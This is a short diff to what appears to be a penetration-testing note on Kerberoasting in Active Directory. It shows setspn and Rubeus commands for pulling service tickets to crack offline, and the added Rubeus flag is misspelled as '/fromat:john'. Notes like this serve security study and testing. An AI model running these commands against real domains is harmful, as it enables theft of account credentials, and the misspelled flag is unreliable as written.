@@ -39,10 +39,11 @@ Invoke-Kerberoast
 setspn -T <DC_hostname> -Q */*
 ```
 - `setspn:` Windows binary used to query info regarding user accounts and services that are bound to the user account.
+- `DC_hostname` could be `krbtown.local`.
 
 **Rubeus**
 ```powershell
-.\Rubeus.exe kerberoast /outfile: <filename.txt>
+.\Rubeus.exe kerberoast /outfile:<filename.txt> /fromat:john
 ```
 
 **Empire**
